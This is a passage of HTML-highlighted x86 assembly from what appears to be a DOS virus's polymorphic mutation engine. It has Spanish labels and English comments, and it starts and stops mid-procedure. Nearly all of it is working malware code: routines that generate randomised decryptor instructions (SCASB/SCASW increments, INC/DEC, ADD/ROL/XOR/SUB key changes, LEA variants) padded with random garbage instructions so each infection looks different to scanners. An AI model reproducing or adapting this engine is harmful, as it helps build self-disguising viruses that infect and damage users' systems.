        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFFCh</span><span class="sc0">      </span><span class="sc1">; Put "CLD/SCASW"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "CLD/SCASW/DEC DI"</span><span class="sc0">
</span><span class="sc5">@@PonSCASWDEC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check for a possible excep-</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; tion that would hang the</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; computer.</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@HazByte</span><span class="sc0">         </span><span class="sc1">; If a exception is possible, jump</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFFCh</span><span class="sc0">      </span><span class="sc1">; Store "CLD/SCASW"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">  </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonDEC</span><span class="sc0">          </span><span class="sc1">; Store "DEC DI"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
    </span><span class="sc1">; Word DI increasing</span><span class="sc0">
</span><span class="sc5">@@HazWord</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random between 0 and 3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSCASW</span><span class="sc0">    </span><span class="sc1">; If 0, store "CLD/SCASW"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonINCSCASB</span><span class="sc0"> </span><span class="sc1">; If 1, store "INC DI/CLD/SCASB"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSCASBINC</span><span class="sc0"> </span><span class="sc1">; If 2, store "CLD/SCASB/INC DI"</span><span class="sc0">
</span><span class="sc1">; Construct "ADD DI,1/CLD/SCASB" or "ADD DI,0/CLD/SCASW"</span><span class="sc0">
</span><span class="sc5">@@PonADDSCASB2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check for exceptions</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; AL = 1 if an exception could</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Ssssalto</span><span class="sc0">         </span><span class="sc1">; happen, and jump</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random 0 or 1</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc5">@@Ssssalto</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Put AL in DH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">      </span><span class="sc1">; Store "ADD DI,&lt;DH&gt;"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">      </span><span class="sc1">; Calculate "SCASB" or "SCASW"</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFh</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FCh</span><span class="sc0">    </span><span class="sc1">; Put "CLD"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store the two instructions</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "INC DI/CLD/SCASB"</span><span class="sc0">
</span><span class="sc5">@@PonINCSCASB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc1">; Put "INC DI"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEFCh</span><span class="sc0">  </span><span class="sc1">; Put "CLD/SCASB"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">; Construct "CLD/SCASB/INC DI"</span><span class="sc0">
</span><span class="sc5">@@PonSCASBINC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEFCh</span><span class="sc0">  </span><span class="sc1">; Put "CLD/SCASB"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc1">; Put "INC DI"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "CLD/SCASW"</span><span class="sc0">
</span><span class="sc5">@@PonSCASW</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; If a exception may occur,</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; then avoid this and search</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; for another type of increa-</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@HazWord</span><span class="sc0">          </span><span class="sc1">; sement</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AFFCh</span><span class="sc0">   </span><span class="sc1">; Construct "CLD/SCASW"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">IncrementaIndice</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">ModificaContador</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to modify the key when it's modified every loop on the decryption</span><span class="sc0">
</span><span class="sc5">ModificaRegistro</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get key register in DL</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">    </span><span class="sc1">; If no register is used like key,</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin</span><span class="sc0">      </span><span class="sc1">; exit</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0004h</span><span class="sc0">    </span><span class="sc1">; Will we modify the key every loop?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin</span><span class="sc0">      </span><span class="sc1">; If not, exit</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordCambio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; Store it here</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">    </span><span class="sc1">; Test method of changing</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonXORoSUB</span><span class="sc0">   </span><span class="sc1">; If Zero Flag, put XOR or SUB</span><span class="sc0">
  </span><span class="sc5">@@PonADDoROL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">    </span><span class="sc1">; Test if ADD or ROL,1</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADD</span><span class="sc0">       </span><span class="sc1">; If Zero Flag, ADD</span><span class="sc0">
     </span><span class="sc5">@@PonROL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0D1h</span><span class="sc0">   </span><span class="sc1">; Insert a "ROL Key_Reg,1"</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">       </span><span class="sc1">; Set register</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store instruction</span><span class="sc0">
    </span><span class="sc5">@@Fin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@PonADD</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C081h</span><span class="sc0">   </span><span class="sc1">; Insert an "ADD Key_Reg,xxxx"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Pon2ADD</span><span class="sc0">      </span><span class="sc1">; If Zero Flag, do it in 2 adds</span><span class="sc0">
   </span><span class="sc5">@@Saltoop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">       </span><span class="sc1">; Set register on opcode</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordCambio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Store value of changing</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
   </span><span class="sc5">@@Pon2ADD</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">@@Saltooo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">       </span><span class="sc1">; Set register on instruction</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save the instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">    </span><span class="sc1">; Get a random value in AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save it on CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">WordCambio</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Subtract it from the value of</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">            </span><span class="sc1">; changing</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store the result</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Get the instruction again</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Store the complementation of the</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; word of changing</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">

 </span><span class="sc5">@@PonXORoSUB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">     </span><span class="sc1">; Is it XOR or SUB?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonXOR</span><span class="sc0">        </span><span class="sc1">; If bit=0, do XOR</span><span class="sc0">
     </span><span class="sc5">@@PonSUB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E881h</span><span class="sc0">    </span><span class="sc1">; Construct a "SUB"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Do it in twice?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Saltooo</span><span class="sc0">       </span><span class="sc1">; If yes, jump here</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Saltoop</span><span class="sc0">       </span><span class="sc1">; If not, store direct value and finish</span><span class="sc0">
   </span><span class="sc5">@@PonXOR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F081h</span><span class="sc0">    </span><span class="sc1">; Construct the "XOR" instruction and</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Saltoop</span><span class="sc0">       </span><span class="sc1">; jump to store it</span><span class="sc0">
</span><span class="sc5">ModificaRegistro</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; This procedure constructs a LEA with a value passed in DH</span><span class="sc0">
</span><span class="sc5">PonLEA</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Dh</span><span class="sc0">     </span><span class="sc1">; Store LEA opcode</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Get encoding for this register</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">TablaIndices</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">XLAT</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">     </span><span class="sc1">; Anulate other bits (if it is BP)</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">       </span><span class="sc1">; Prepare it for the second opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">       </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto02</span><span class="sc0">     </span><span class="sc1">; If Zero Flag, set a byte-adding index</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">      </span><span class="sc1">; Put direct value</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
 </span><span class="sc5">@@Salto02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">     </span><span class="sc1">; Set a word-adding index</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Store the second opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">      </span><span class="sc1">; Get the byte to add</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">         </span><span class="sc1">; Convert in AX to a signed one</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store the resulting word</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonLEA</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to insert an "INC" or a "DEC" with the register in DL. This ins-</span><span class="sc0">
</span><span class="sc1">;; tructions can be made with two different opcodes, so the routine uses them.</span><span class="sc0">
</span><span class="sc1">;;; Here to make a DEC</span><span class="sc0">
</span><span class="sc5">PonDEC</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">      </span><span class="sc1">; Put "DEC"</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">Sigue</span><span class="sc0">        </span><span class="sc1">; Jump here</span><span class="sc0">
</span><span class="sc1">;;; Here to make an INC</span><span class="sc0">
</span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Save CX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; Put "INC"</span><span class="sc0">
     </span><span class="sc5">Sigue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto01</span><span class="sc0">      </span><span class="sc1">; If Zero Flag, jump</span><span class="sc0">
      </span><span class="sc1">; One type of opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">; Offset of some instructions</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">       </span><span class="sc1">; Put register in AH</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">     </span><span class="sc1">; Set "register operation" on</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; Put INC or DEC</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">            </span><span class="sc1">; Store the instruction</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Recover CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
      </span><span class="sc1">; Another type of opcode</span><span class="sc0">
     </span><span class="sc5">@@Salto01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">       </span><span class="sc1">; Put register in AL</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Add 40h to the register</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc0">       </span><span class="sc1">; Set INC or DEC in the instruction</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">            </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Recover CX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">PonDEC</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to construct an ADD instruction with two different types: with</span><span class="sc0">
</span><span class="sc1">;; word operand and word reduced to signed byte. We must pass the value to add</span><span class="sc0">
</span><span class="sc1">;; in DH</span><span class="sc0">
</span><span class="sc5">PonADD</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Set "register operation" on in the second</span><span class="sc0">
                    </span><span class="sc1">; opcode and ADD operation</span><span class="sc0">
  </span><span class="sc5">PonALGO</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">     </span><span class="sc1">; Main opcode</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; Put register to use</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store instruction</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">      </span><span class="sc1">; Put value to add in AL</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">         </span><span class="sc1">; Extende AL to word with signe in AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">       </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto001</span><span class="sc0">    </span><span class="sc1">; If Zero Flag, go on with this instruction</span><span class="sc0">
